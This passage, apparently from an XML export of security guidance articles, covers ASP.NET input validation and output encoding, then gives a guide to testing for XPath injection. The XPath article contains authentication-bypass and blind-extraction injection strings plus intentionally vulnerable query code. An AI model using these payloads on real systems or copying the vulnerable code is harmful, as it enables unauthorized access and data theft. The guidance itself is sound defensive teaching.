method="post"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;div&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Enter an integer between 0 and 255:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;input name="integerTxt" type="text" /&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;input name="Submit" type="submit" value="submit" /&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/div&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/form&gt;<br>&nbsp; &lt;/body&gt;<br>&lt;/html&gt;</pre><h3>Validating Date Fields</h3><p>You need to validate that date fields are of the correct type. In most cases, you also need to check them for range, for example to validate that they are in the future or past. If you use a server control to capture an input date, and if you also need to validate that a date falls within a specific range, you can use a <strong>RangeValidator</strong> control with its <strong>Type</strong> field set to <strong>Date</strong>. This control lets you specify a range by using constant date values. If you need to validate a date range based on today's date, for example to validate that a date is in the future or the past, you can use a <strong>CustomValidator</strong> control.</p><p>To use a <strong>CustomValidator</strong> control to validate a date, set the <strong>ControlToValidate</strong> and <strong>ErrorMessage</strong> properties and the <strong>OnServerValidate</strong> event to point to a custom method containing your validation logic. The following sample .aspx page code shows this approach.</p><div><pre>&lt;%@ Page Language="C#" %&gt;</pre><pre>&lt;script runat="server"&gt;</pre><pre>&nbsp;void ValidateDateInFuture(object source, ServerValidateEventArgs args)<br>&nbsp;{<br>&nbsp;&nbsp; DateTime dt;</pre></div><pre>&nbsp;&nbsp; // Check for valid date and that the date is in the future<br>&nbsp;&nbsp; if ((DateTime.TryParse(args.Value, out dt) == false) || <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (dt &lt;= DateTime.Today))<br>&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp; args.IsValid = false;<br>&nbsp;&nbsp; }<br>&nbsp;}&nbsp;</pre><pre>&lt;/script&gt;</pre><pre>&lt;html&gt;<br>&nbsp; &lt;body&gt;<br>&nbsp;&nbsp;&nbsp; &lt;form id="form1" runat="server"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;div&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:Label ID="Label1" Runat="server" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Text="Future Date:"&gt;&lt;/asp:Label&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:TextBox ID="futureDatetxt" Runat="server"&gt;&lt;/asp:TextBox&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:CustomValidator <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ID="CustomValidator1" Runat="server" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ErrorMessage="Invalid date. Enter a date in the future."<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ControlToValidate="futureDatetxt"&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OnServerValidate="ValidateDateInFuture"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/asp:CustomValidator&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;br /&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:Button ID="submitBtn" Runat="server" Text="Submit"&nbsp; /&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/div&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/form&gt;<br>&nbsp; &lt;/body&gt;<br>&lt;/html&gt;<br></pre><blockquote><strong>Note</strong>&nbsp;&nbsp;&nbsp;The preceding code uses <strong>DateTime.TryParse</strong>, which is new to .NET Framework 2.0.</blockquote><h2>Sanitizing Free-Text Fields</h2><p>To <em>sanitize</em> input, you make untrusted input safe by preventing it from being treated as code. For example, if your application handles user input that it cannot constrain or reads data from a shared database, you might need to sanitize the data or make the output safe when you write it on your page. Sanitize data prior to output by using <strong>AntiXSSLibrary.HtmlEncode</strong>. </p><h2>Allowing Restricted HTML Input</h2><p>If your application needs to accept a range of HTML elements—for example through a rich text input field such as a comments field—turn off ASP.NET request validation and create a filter that allows only the HTML elements that you want your application to accept. A common practice is to restrict formatting to safe HTML elements such as &lt;<strong>b</strong>&gt; (bold) and &lt;<strong>i</strong>&gt; (italic). Before writing the data, HTML-encode it. This makes any malicious script safe by causing it to be handled as text, not as executable code. </p><h2>To allow restricted HTML input </h2><ol><li>Disable ASP.NET request validation by the adding the <strong>ValidateRequest="false"</strong> attribute to the <strong>@ Page</strong> directive. </li><li>Encode the string input with the <strong>HtmlEncode</strong> method. </li><li>Use a <strong>StringBuilder</strong> and call its Replace method to selectively remove the encoding on the HTML elements that you want to permit. </li></ol><p>The following .aspx page code shows this approach. The page disables ASP.NET request validation by setting <strong>ValidateRequest="false"</strong>. It HTML-encodes the input and selectively allows the &lt;<strong>b</strong>&gt; and &lt;<strong>i</strong>&gt; HTML elements to support simple text formatting. </p><div><pre>&lt;%@ Page Language="C#" ValidateRequest="false"%&gt;</pre><pre>&lt;script runat="server"&gt;</pre><pre>&nbsp; void submitBtn_Click(object sender, EventArgs e)<br>&nbsp; {<br>&nbsp;&nbsp;&nbsp; // Encode the string input<br>&nbsp;&nbsp;&nbsp; StringBuilder sb = new StringBuilder(<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; AntiXSSLibrary.HtmlEncode(htmlInputTxt.Text));<br>&nbsp;&nbsp;&nbsp; // Selectively allow&nbsp; and &lt;i&gt;<br>&nbsp;&nbsp;&nbsp; sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;");<br>&nbsp;&nbsp;&nbsp; sb.Replace("&amp;lt;/b&amp;gt;", "");<br>&nbsp;&nbsp;&nbsp; sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;");<br>&nbsp;&nbsp;&nbsp; sb.Replace("&amp;lt;/i&amp;gt;", "");<br>&nbsp;&nbsp;&nbsp; Response.Write(sb.ToString());<br>&nbsp; }<br>&lt;/script&gt;</pre><pre>&lt;html&gt;<br>&nbsp; &lt;body&gt;<br>&nbsp;&nbsp;&nbsp; &lt;form id="form1" runat="server"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;div&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:TextBox ID="htmlInputTxt" Runat="server" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TextMode="MultiLine" Width="318px"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Height="168px"&gt;&lt;/asp:TextBox&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:Button ID="submitBtn" Runat="server" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Text="Submit" OnClick="submitBtn_Click" /&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/div&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/form&gt;<br>&nbsp; &lt;/body&gt;<br>&lt;/html&gt;  </pre></div><h2>Validate Query String Values</h2><p>Validate query string values for length, range, format, and type. You usually do this by using a combination of regular expressions to: </p><ul><li>Constrain the input values. </li><li>Set explicit range checks. </li><li>Specify the explicit type checks performed by converting the input value to its equivalent .NET Framework type and handling any ensuing conversion errors. </li></ul><p>The following code example shows how to use the <strong>Regex</strong> class to validate a name string passed on a query string. </p><div><pre>void Page_Load(object sender, EventArgs e)<br>{<br>&nbsp; if (!System.Text.RegularExpressions.Regex.IsMatch(<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Request.QueryString["Name"], @"^[a-zA-Z'.\s]{1,40}$"))<br>&nbsp;&nbsp;&nbsp; Response.Write("Invalid name parameter");<br>&nbsp; else<br>&nbsp;&nbsp;&nbsp; Response.Write("Name is " + Request.QueryString["Name"]);<br>}  </pre></div><h2>Validate Cookie Values</h2><p>Values maintained in cookies, such as query string parameters, can easily be manipulated by a client. Validate cookie values in the same way as you would for query string parameters. Validate them for length, range, format, and type.</p><h2>Validate File and URL Paths</h2><p>If your application has to accept input file names, file paths, or URL paths, you need to validate that the path is in the correct format and that it points to a valid location within the context of your application. Failure to do this can result in attackers persuading your application into accessing arbitrary files and resources. </p><h3>Validating File Paths</h3><p>To prevent a malicious user manipulating your code's file operations, avoid writing code that accepts user-supplied file or path input. For example: </p><ul><li>If you must accept file names as input, use the full name of the file by using <strong>System.IO.Path.GetFileName</strong>. </li><li>If you must accept file paths as input, use the full file path by using <strong>System.IO.Path.GetFullPath</strong>. </li></ul><h3>Using MapPath to Prevent Cross Application Mapping</h3><p>If you use <strong>MapPath</strong> to map a supplied virtual path to a physical path on the server, use the overload of <strong>Request.MapPath</strong> that accepts a <strong>bool</strong> parameter so that you can prevent cross-application mapping. The following code example shows this technique.</p><div><pre>try<br>{<br>&nbsp; string mappedPath = Request.MapPath( inputPath.Text, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Request.ApplicationPath, false);<br>}<br>catch (HttpException)<br>{<br>&nbsp; // Cross-application mapping attempted<br>}  </pre></div><p>The final <strong>false</strong> parameter prevents cross-application mapping. This means that a user cannot successfully supply a path that contains <strong>".."</strong> to traverse outside of your application's virtual directory hierarchy. Any attempt to do this results in an exception of type <strong>HttpException</strong>.</p><p>If you use server controls, you can use the <strong>Control.MapPathSecure</strong> method to retrieve the physical path to which the virtual path is mapped. <strong>Control.MapPathSecure</strong> uses code access security and throws an <strong>HttpException</strong> if the server control does not have permissions to read the resulting mapped file. For more information, see <strong>Control.MapPathSecure</strong> in the .NET Framework SDK documentation.</p><h3>Using Code Access Security to Restrict File I/O</h3><p>An administrator can restrict an application's file I/O to its own virtual directory hierarchy by configuring the application to run with Medium trust. In this event, .NET code access security ensures that no file access is permitted outside of the application's virtual directory hierarchy.</p><p>You configure an application to run with Medium trust by setting the &lt;<strong>trust</strong>&gt; element in Web.config or Machine.config.</p><div><pre>&lt;trust level="Medium" /&gt;  </pre></div><h3>Validating URLs</h3><p>You can filter for a valid URL format using a regular expression, such as the following.</p><div><pre>^(?:http|https|ftp)://[a-zA-Z0-9\.\-]+(?:\:\d{1,5})?(?:[A-Za-z0-9\.\;\:\@\&amp;\=\+\$\,\?/]|%u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2})*$  </pre></div><p>This constrains the input, but it does not validate whether the URL is valid in terms of the application boundaries. You should check whether the target is valid in the context of your application. For example, does it point to an authorized server that you expect your application to communicate with?</p><h1>Step 3. Encode Unsafe Output</h1><p>If you write text output to a Web page, encode it using <strong>AntiXSSLibrary.HtmlEncode</strong>. Do this if the text came from user input, a database, or a local file. </p><p>Similarly, if you write URLs that might contain unsafe characters because they have been constructed from input data or data from a shared database, use <strong>AntiXSSLibrary.UrlEncode</strong> to make them safe. </p><p>Avoid the mistake of encoding the data early. Make sure you encode at the last possible opportunity before the data is displayed to the client. </p><p>Do not use the <strong>HttpUtilty </strong>class provided by ASP.NET as it does not do a complete job of protecting against cross site scripting attacks, the <strong>AntiXSSLibrary </strong>is much more effective.</p><h2>Use HtmlEncode to Encode Unsafe Output</h2><p>The <strong>HtmlEncode</strong> method replaces characters that have special meaning in HTML to HTML variables that represent those characters. For example, &lt; is replaced with <strong>&amp;lt;</strong> and <strong>"</strong> is replaced with <strong>&amp;quot;</strong>. Encoded data does not cause the browser to execute code. Instead, the data is rendered as harmless text, and the tags are not interpreted as HTML.</p><p>To illustrate the use of <strong>HtmlEncode</strong>, the following page accepts input from the user and allows potentially unsafe HTML characters by setting <strong>ValidateRequest="false"</strong>. Before writing the input back to the user, the code calls <strong>AntiXSSLibrary.HtmlEncode</strong> on the supplied input text. This renders any potentially unsafe HTML as harmless text. </p><div><pre>&lt;%@ Page Language="C#" ValidateRequest="false" %&gt;</pre><pre>&lt;script runat="server"&gt;<br>&nbsp; void submitBtn_Click(object sender, EventArgs e)<br>&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Response.Write(AntiXSSLibrary.HtmlEncode(inputTxt.Text));<br>&nbsp; }<br>&lt;/script&gt;</pre><pre>&lt;html&nbsp; &gt;<br>&nbsp; &lt;body&gt;<br>&nbsp;&nbsp;&nbsp; &lt;form id="form1" runat="server"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;div&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:TextBox ID="inputTxt" Runat="server" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TextMode="MultiLine" Width="382px" Height="152px"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/asp:TextBox&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:Button ID="submitBtn" Runat="server" Text="Submit" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OnClick="submitBtn_Click" /&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/div&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/form&gt;<br>&nbsp; &lt;/body&gt;<br>&lt;/html&gt;  </pre></div><p>To see the effect of the HTML encoding, place the preceding page in a virtual directory, browse to it, enter some HTML code in the input text box, and click <strong>Submit</strong>. For example, the following input is rendered as text.</p><div><pre>Run script and say hello &lt;script&gt;alert('hello');&lt;/script&gt;  </pre></div><p>It produces the following safe output.</p><div><pre>Run script and say hello &lt;script&gt;alert('hello');&lt;/script&gt;  </pre></div><p>If you remove the call to <strong>HtmlEncode</strong> and simply write back the input, the browser executes the script and displays a message box. Malicious script could pose a significant threat. </p><h2>Use UrlEncode to Encode Unsafe URLs</h2><p>If you need to write URLs that are based on input that you do not fully trust, use <strong>AntiXSSLibrary.UrlEncode</strong> to encode the URL string.</p><div><pre>AntiXSSLibrary.UrlEncode( urlString );  </pre></div><h1>Step 4. Use Command Parameters for SQL Queries</h1><p>To help prevent SQL injection, use command parameters for SQL queries. The <strong>Parameters</strong> collection provides type checking and length validation. If you use the <strong>Parameters</strong> collection, input is treated as a literal value and SQL does not treat it as executable code. An additional benefit of using the <strong>Parameters</strong> collection is that you can enforce type and length checks. Values outside of the range trigger an exception.</p><h2>Use Parameters Collection When You Call a Stored Procedure</h2><p>The following code fragment illustrates the use of the <strong>Parameters</strong> collection when calling a stored procedure.</p><div><pre>SqlDataAdapter myCommand = new SqlDataAdapter("AuthorLogin", <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; myConnection);<br>myCommand.SelectCommand.CommandType = CommandType.StoredProcedure;<br>SqlParameter parm = myCommand.SelectCommand.Parameters.Add(<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "@LoginId", SqlDbType.VarChar, 11);<br>parm.Value = Login.Text;  </pre></div><h2>Use Parameters Collection When Building Your SQL Statements</h2><p>If you cannot use stored procedures, you can still use parameters, as shown in the following code fragment.</p><div><pre>SqlDataAdapter myCommand = new SqlDataAdapter(<br>"SELECT au_lname, au_fname FROM Authors WHERE au_id = @au_id", myConnection);<br>SQLParameter parm = myCommand.SelectCommand.Parameters.Add(<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "@au_id" ,SqlDbType.VarChar, 11);<br>Parm.Value = Login.Text;  </pre></div><p>For more information about how to prevent SQL injection, see <a href="http://msdn2.microsoft.com/en-us/library/ms998271.aspx">How to: Protect From SQL Injection in ASP.NET</a>.</p><h1>Step 5. Verify that ASP.NET Errors Are Not Returned to the Client</h1><p>You can use the &lt;<strong>customErrors</strong>&gt; element to configure custom, generic error messages that should be returned to the client in the event of an application exception condition.</p><p>Make sure that the <strong>mode</strong> attribute is set to <strong>"remoteOnly"</strong> in the web.config file as shown in the following example.</p><div><pre>&lt;customErrors mode="remoteOnly" /&gt;  </pre></div><p>After installing an ASP.NET application, you can configure the setting to point to your custom error page as shown in the following example.</p><div><pre>&lt;customErrors mode="On" defaultRedirect="YourErrorPage.htm" /&gt;  </pre></div><hr><p>Adapted from Microsoft patterns &amp; practices guidance.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="1240767300" Content_Hash="1321903725">
    <Metadata>
      <Id>6f1b7e6d-ebea-4011-81d8-82cac1dadf69</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>How to Test for XPath Injection Bugs</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Test</Phase>
      <Technology> Any</Technology>
      <Type>How To</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>Andres De Vivanco</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<p><strong>&nbsp;</strong></p><h1>Applies to:</h1><ul><li>Web applications that use XPath to query XML data. Usually these applications are developed using ASP .Net, Java, PHP, Python and Ruby.</li></ul><p>&nbsp;</p><h1>Summary</h1><p>XPath is a language to query over XML data.&nbsp; Even though XPath is only used for querying data, it suffers from an injection vulnerability similar to SQL Injection.&nbsp; An attacker that manipulates the parameters used in an XPath query can modify the logic of an original query to perform an authentication bypass or execute information disclosure attacks. </p><p>It is recommended that you follow these steps to test for XPath Injection vulnerabilities:</p><ul><li>Step 1:&nbsp; Understand Attack Scenarios </li><li>Step 2:&nbsp; Analyze Causes and Countermeasures </li><li>Step 3:&nbsp; Start Testing and Exploring </li><li>Step 4:&nbsp; Fine-tune Test Cases</li></ul><p>&nbsp;</p><h1>Step 1:&nbsp; Understand Attack Scenarios</h1><p>First, you must understand the details of XPath attack scenarios.&nbsp; Similar to SQL injection, there are two types of XPath attacks:</p><ul><li>Normal XPath Injection </li><li>Blind XPath Injection</li></ul><p>&nbsp;</p><h2><em>Scenario 1: Normal XPath Injection </em></h2><p>In order to follow this and the next scenario, you must understand the background for XPath queries.&nbsp;&nbsp; XPath is a language that queries on XML data such as the file below:</p><pre>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; <br>&lt;users&gt; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;user&gt; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;username&gt;johns&lt;/username&gt; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;password&gt;abc123&lt;/password&gt; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;fullname&gt;John Smith&lt;/fullname&gt; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/user&gt; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;user&gt; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;username&gt;billg&lt;/username&gt; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;password&gt;qwerty&lt;/password&gt; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;fullname&gt;Bill Graves&lt;/fullname&gt; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/user&gt; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;user&gt; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;username&gt;mrt&lt;/username&gt; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;password&gt;pr1v@t3&lt;/password&gt; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;account&gt;Mr. T&lt;/account&gt; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/user&gt; <br>&lt;/users&gt;<br>&nbsp;&nbsp;</pre><p>An XPath query consists of expressions containing backslashes (/) and dots (.) that are used to select nodes from the root node down and predicates enclosed in squared brackets ([]) used to include <em>when</em> conditions:</p><pre>/users/user/username&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </pre><pre>/users/user[username/text() ='johns'] </pre><p>The first query returns all username nodes while the second uses a predicate to search all usernames that match the string <em>johns</em>.</p><p>A common scenario is to use XPath to perform authentication.&nbsp; For example, the next query grabs a username and password from a web form and check if they match the ones of a valid user [i]:</p><pre>//users/user[username/text()='" + Request.QueryString("username") + "' and password/text()='" + Request.QueryString("password") + "']";</pre><p>If a user enters safe values (username=test, password=123) the application builds a standard authentication query:</p><pre>//users/user[username/text()='test' and password/text()='123']</pre><p>However an attacker can use the web form to submit the following injection string as the username and 123 as the password:</p><pre><strong>user' or '1' = '1</strong></pre><p>The resulting XPath query looks like this:</p><pre>/users/user[username/text()='<strong>user' or '1' = '1'</strong> and password/text()='123']</pre><p>Unlike SQL, XPath disallows commenting the rest of the expression so the attacker needs to insert an <em>or</em> condition that makes the password check irrelevant.&nbsp; The modified query returns all the users and the result is an attack against the authentication scheme in use.</p><p>&nbsp;</p><h2><em>Scenario 2: Blind XPath Injection </em></h2><p>Similar to blind SQL Injection, blind XPath Injection uses true and false conditions to infer confidential information.&nbsp; For example, an attacker wants to retrieve another user’s password but has no way of forcing the web application to display it on screen.&nbsp; The attacker uses blind XPath injection to steal the victim passwords character by character.&nbsp; </p><p>In the example below, the attacker now logs in with a valid account (johns) and tries to steal the password of another user.&nbsp;&nbsp; The attacker passes this attack string to check if the password for the third user in the document tree ("mrt") starts with an "a" [ii]:</p><pre><strong>johns' and substring((//user[position()=3]/child::node()[position()=2]),1,1)="a" and '1' = '1</strong></pre><p>The resulting XPath query looks the one below (note that the attacker needs to pass his valid username and password). The statement only returns true if the substring() condition is true:&nbsp; </p><pre>/users/user[username/text()='<strong>johns' and substring((//user[position()=3]/child::node()[position()=2]),1,1)="a" and '1' = '1</strong>' and password/text()='abc123']</pre><p>The attacker can craft similar blind commands to check data lengths using string-length().&nbsp; For instance, the next query returns true if the length of the target password is 7:</p><pre>/users/user[username/text()='<strong>johns' and string-length(//user[position()=3]/child::node()[position()=2]) and '1' = '1</strong>' and password/text()='abc123']</pre><p>The attacker can use additional functions such as count(), contains() to reveal both the contents of an XML store as well as its structure.&nbsp; Exploring the logic and hierarchy of an XML document is known as <em>XML Crawling</em>.</p><p>&nbsp;</p><h1>Step 2:&nbsp; Analyze Causes and Countermeasures</h1><p>The following step in testing for XPath Injection bugs is to understand what causes them and how to defend against them.</p><h2><em>XPath Injection Cause</em></h2><p>XPath Injection bugs exist due to poor input validation on and failing to sanitize the parameters used in an XPath query.&nbsp; For example, consider the following PHP code:</p><pre>&lt;?php<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $xml = simplexml_load_file("users.xml");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $result = $xml-&gt;xpath("//users/user[username/text()='"<strong>. $_GET['name'] </strong>. "']");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print_r($result);<br>?&gt;&nbsp;</pre><p>The PHP application uses the value passed in the URL parameter name in the XPath query without checking for injected commands.</p>
<p>Make sure to look at the API functions that your application uses to execute XPath queries.&nbsp;&nbsp; This table shows some common XPath APIs:&nbsp;</p><table><tbody><tr><td><pre><strong>Class/API</strong></pre></td><td><p><strong>Language</strong></p></td></tr><tr><td><pre>XPath.compile() </pre><pre>XPathExpression.evaluate()</pre><pre>&nbsp;</pre><pre>&nbsp;</pre></td><td><p>Java</p></td></tr><tr><td><pre>XPathNavigator.Select()</pre><p>XPathNavigator.Evaluate()</p></td><td><p>ASP .NET</p></td></tr><tr><td><p>xpath()</p></td><td><p>PHP</p></td></tr><tr><td><p>findvalue()</p></td><td><p>Perl</p></td></tr></tbody></table><p>&nbsp;</p><p><strong><em></em></strong></p><h2><em>XPath Injection Countermeasures</em></h2><p>XPath Injection vulnerabilities can be prevented by sanitizing user input.&nbsp; Specifically, the application needs to disallow any single or double quotes inputted by a user from making it to an XPath query.&nbsp;&nbsp; Sometimes the input doesn’t come directly from the user but is read from a persistent data source such as a database or an environment variable.&nbsp;&nbsp; In these cases, the application must sanitize the data coming from the data source and into the XPath query.</p>
<p>A proposed method [iii] consists of escaping any single quotes (VB):</p>
<pre>Dim FindUserXPath as String<br>FindUserXPath = "//Employee[UserName/text()='" &amp;<br>Request("Username").Replace("'", "&amp;apos;") &amp; "' And<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Password/text()='" &amp; Request("Password").Replace("'", "&amp;apos;") &amp; "']"<br></pre><p>Other methods include using parameterized XPath queries to properly handle user input. </p><p><strong>&nbsp;</strong></p><h1>Step 3:&nbsp; Start Testing and Exploring</h1><p>Now that you are familiar with the inner workings of XPath injection attacks and able to recognize both its causes and countermeasures, &nbsp;you must continue by executing basic XPath Injection black box test cases and exploring the results.</p><h2><em>Start with a simple test string</em></h2><p>Almost all XPath Injection strings must contain either a single or a double quote.&nbsp; Your first test pass must consist of submitting a string containing quotes to see how the application reacts to it:</p><pre><strong>abc'xyz"</strong></pre><p>If the server doesn’t return an error message and uses this string for an XPath query, it is almost certain that you’ll find an XPath Injection bug.&nbsp;</p><h2><em>Testing for Normal XPath Injection Authentication Bypass </em></h2><p>Hardware Requirements:&nbsp; One client computer and one server computer running the web application.</p><p>Tools:&nbsp;&nbsp; Web browser.</p><p>Testing steps:</p><ol><li>In the client computer, open the web browser and navigate to an 